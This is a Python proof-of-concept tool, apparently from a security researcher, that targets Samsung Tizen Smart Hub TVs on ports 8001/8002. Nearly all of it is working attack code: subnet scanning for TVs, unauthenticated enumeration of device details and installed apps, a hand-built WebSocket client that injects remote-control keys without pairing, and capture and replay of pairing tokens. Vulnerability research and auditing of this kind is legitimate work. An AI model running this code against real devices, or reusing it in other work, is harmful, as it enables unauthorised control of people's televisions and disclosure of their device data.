#!/usr/bin/env python3
"""
Samsung Tizen Smart Hub API Auditor
====================================
PoC for TIZEN-2026-001 (Unauthenticated API) and TIZEN-2026-005 (Token Reuse)

Tests the Samsung Smart Hub REST and WebSocket API on ports 8001/8002 for:
- Unauthenticated device enumeration
- Remote key injection without pairing
- Token capture and replay attack

Usage:
    python3 tizen_smarthub_audit.py --target <TV_IP>
    python3 tizen_smarthub_audit.py --scan 192.168.1.0/24

Author: Andre Henrique (@mrhenrike) | Uniao Geek — https://github.com/Uniao-Geek
Research IDs: TIZEN-2026-001, TIZEN-2026-005
"""
import argparse
import json
import os
import socket
import sys
import tempfile
import threading
import time
import urllib.request
import urllib.error
import base64
import struct
import hashlib
import ipaddress

# --- Ensure temp dir is inside project ---
_project_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", ".tmp")
os.makedirs(_project_tmp, exist_ok=True)
tempfile.tempdir = _project_tmp


API_PORTS   = (8001, 8002)
API_PATHS   = ("/api/v2/", "/api/v2")
WS_PATH     = "/api/v2/channels/samsung.remote.control"
TIMEOUT     = 4.0
APP_ID      = "org.tizen.browser"

SAMSUNG_TV_KEYS = [
    "KEY_POWER", "KEY_MENU", "KEY_UP", "KEY_DOWN", "KEY_LEFT", "KEY_RIGHT",
    "KEY_ENTER", "KEY_RETURN", "KEY_CH_UP", "KEY_CH_DOWN", "KEY_VOLUP",
    "KEY_VOLDOWN", "KEY_MUTE", "KEY_SOURCE", "KEY_INFO", "KEY_HOME",
    "KEY_BACK", "KEY_PLAY", "KEY_PAUSE", "KEY_STOP",
]


class SmartHubAuditor:
    def __init__(self, target: str, verbose: bool = False):
        self.target  = target
        self.verbose = verbose
        self.results = {
            "target":         target,
            "timestamp":      time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "device_info":    None,
            "api_open_ports": [],
            "unauth_access":  False,
            "token_reuse":    False,
            "ws_key_inject":  False,
            "findings":       [],
        }

    def _http_get(self, port: int, path: str) -> dict | None:
        url = f"http://{self.target}:{port}{path}"
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                return json.loads(resp.read().decode())
        except Exception:
            return None

    def enumerate_device(self) -> bool:
        """Try to fetch device info without credentials."""
        for port in API_PORTS:
            for path in API_PATHS:
                data = self._http_get(port, path)
                if data and "device" in data:
                    self.results["device_info"]    = data["device"]
                    self.results["unauth_access"]  = True
                    self.results["api_open_ports"].append(port)
                    self.results["findings"].append({
                        "id":       "TIZEN-2026-001",
                        "severity": "CRITICAL",
                        "title":    "Unauthenticated Smart Hub API",
                        "evidence": f"GET http://{self.target}:{port}{path} returned device info without auth",
                        "data":     data.get("device", {}),
                    })
                    if self.verbose:
                        print(f"  [+] Unauthenticated access on :{port}{path}")
                        print(f"      Model:    {data['device'].get('modelName','?')}")
                        print(f"      Firmware: {data['device'].get('firmwareVersion','?')}")
                        print(f"      MAC:      {data['device'].get('wifiMac','?')}")
                    return True
        return False

    def _ws_handshake(self, sock: socket.socket, host: str, port: int, path: str) -> bool:
        """Minimal WebSocket handshake (RFC 6455)."""
        key = base64.b64encode(os.urandom(16)).decode()
        handshake = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n\r\n"
        ).encode()
        sock.sendall(handshake)
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = sock.recv(4096)
            if not chunk:
                return False
            resp += chunk
        return b"101" in resp

    def _ws_send_frame(self, sock: socket.socket, data: str) -> None:
        """Send a WebSocket text frame with masking."""
        payload  = data.encode()
        mask_key = os.urandom(4)
        masked   = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        plen     = len(payload)
        if plen <= 125:
            header = bytes([0x81, 0x80 | plen]) + mask_key
        else:
            header = bytes([0x81, 0xFE]) + struct.pack(">H", plen) + mask_key
        sock.sendall(header + masked)

    def _ws_recv_frame(self, sock: socket.socket) -> str:
        """Receive a WebSocket frame and return payload."""
        header = sock.recv(2)
        if len(header) < 2:
            return ""
        plen = header[1] & 0x7F
        if plen == 126:
            plen = struct.unpack(">H", sock.recv(2))[0]
        elif plen == 127:
            plen = struct.unpack(">Q", sock.recv(8))[0]
        return sock.recv(plen).decode(errors="replace")

    def test_ws_key_inject(self, key: str = "KEY_MUTE", token: str = "") -> bool:
        """Attempt to send a remote control key via WebSocket without pairing."""
        app_name = base64.b64encode(b"TizenSecAudit").decode()
        path     = WS_PATH
        if token:
            path += f"?token={token}"

        connect_cmd = json.dumps({
            "method": "ms.channel.connect",
            "params": {
                "name":     app_name,
                "token":    token,
            }
        })
        key_cmd = json.dumps({
            "method":  "ms.remote.control",
            "params":  {"Cmd": "Click", "DataOfCmd": key, "Option": "false", "TypeOfRemote": "SendRemoteKey"}
        })

        for port in (8001,):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)
                sock.connect((self.target, port))
                if not self._ws_handshake(sock, self.target, port, path):
                    sock.close()
                    continue
                self._ws_send_frame(sock, connect_cmd)
                time.sleep(0.5)
                resp = self._ws_recv_frame(sock)
                if self.verbose:
                    print(f"  [WS] Connect response: {resp[:200]}")

                # Check if we got a token back (pairing bypassed)
                token_resp = ""
                try:
                    rd = json.loads(resp)
                    token_resp = rd.get("data", {}).get("token", "")
                except Exception:
                    pass

                self._ws_send_frame(sock, key_cmd)
                time.sleep(0.3)
                key_resp = self._ws_recv_frame(sock)
                sock.close()

                if "error" not in key_resp.lower():
                    self.results["ws_key_inject"] = True
                    self.results["findings"].append({
                        "id":       "TIZEN-2026-001",
                        "severity": "CRITICAL",
                        "title":    "WebSocket Key Injection — Unauthenticated",
                        "evidence": f"Sent {key} via WS port {port} without pairing",
                        "token_received": token_resp,
                    })
                    if token_resp:
                        self.results["token_reuse"] = True
                        self.results["findings"].append({
                            "id":       "TIZEN-2026-005",
                            "severity": "HIGH",
                            "title":    "Smart Hub Token Captured (Replayable)",
                            "evidence": f"Token '{token_resp}' received in plaintext — can be replayed",
                        })
                    return True
            except Exception as e:
                if self.verbose:
                    print(f"  [WS] :{port} error: {e}")
        return False

    def probe_apps(self) -> list:
        """Enumerate installed apps via Smart Hub API."""
        apps = []
        for port in self.results["api_open_ports"]:
            data = self._http_get(port, "/api/v2/applications")
            if data and isinstance(data, list):
                apps = [{"id": a.get("appId"), "name": a.get("name")} for a in data]
                self.results["findings"].append({
                    "id":       "TIZEN-2026-001",
                    "severity": "MEDIUM",
                    "title":    "Installed Apps Disclosed Without Auth",
                    "evidence": f"{len(apps)} apps enumerated unauthenticated",
                    "apps":     apps[:20],
                })
                break
        return apps

    def run(self) -> dict:
        print(f"\n[*] Samsung Smart Hub Audit — {self.target}")
        print("="*55)

        if not self.enumerate_device():
            print(f"  [-] No Smart Hub API found on {self.target}:8001/8002")
        else:
            info = self.results["device_info"] or {}
            print(f"  [+] Device: {info.get('modelName','?')} | FW: {info.get('firmwareVersion','?')}")

        print("  [*] Testing WebSocket key injection...")
        self.test_ws_key_inject("KEY_MUTE")

        print("  [*] Probing app list...")
        apps = self.probe_apps()
        if apps:
            print(f"  [+] {len(apps)} apps enumerated without auth")

        print(f"\n  Findings: {len(self.results['findings'])}")
        for f in self.results["findings"]:
            print(f"    [{f['severity']}] {f['id']}: {f['title']}")

        return self.results


def scan_subnet(subnet: str, verbose: bool = False) -> list:
    """Scan a /24 subnet for Samsung Smart Hub TVs."""
    targets = list(ipaddress.ip_network(subnet, strict=False).hosts())
    found   = []
    lock    = threading.Lock()

    def probe(ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((str(ip), 8001)) == 0:
                sock.close()
                auditor = SmartHubAuditor(str(ip), verbose=verbose)
                if auditor.enumerate_device():
                    with lock:
                        found.append(auditor.results)
                        print(f"  [+] {ip} — Samsung TV found: {auditor.results['device_info'].get('modelName','?')}")
            else:
                sock.close()
        except Exception:
            pass

    threads = [threading.Thread(target=probe, args=(ip,), daemon=True) for ip in targets]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return found


def main():
    parser = argparse.ArgumentParser(description="Samsung Tizen Smart Hub Auditor (TIZEN-2026-001/005)")
    group  = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--target", help="Single TV IP address")
    group.add_argument("--scan",   help="Subnet to scan (e.g. 192.168.1.0/24)")
    parser.add_argument("--key",   default="KEY_MUTE",  help="Key to inject (default: KEY_MUTE)")
    parser.add_argument("--token", default="",          help="Token to replay (TIZEN-2026-005)")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--output", "-o", help="Output JSON file")
    args = parser.parse_args()

    results = []
    if args.target:
        auditor = SmartHubAuditor(args.target, verbose=args.verbose)
        results = [auditor.run()]
    elif args.scan:
        print(f"[*] Scanning {args.scan} for Samsung TVs...")
        results = scan_subnet(args.scan, verbose=args.verbose)

    if args.output:
        out_path = args.output
    else:
        out_path = os.path.join(_project_tmp, "tizen_smarthub_audit.json")

    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[*] Results saved: {out_path}")

    vuln_count = sum(1 for r in results if r.get("unauth_access") or r.get("ws_key_inject"))
    print(f"[*] Vulnerable targets: {vuln_count}/{len(results)}")


if __name__ == "__main__":
    main()
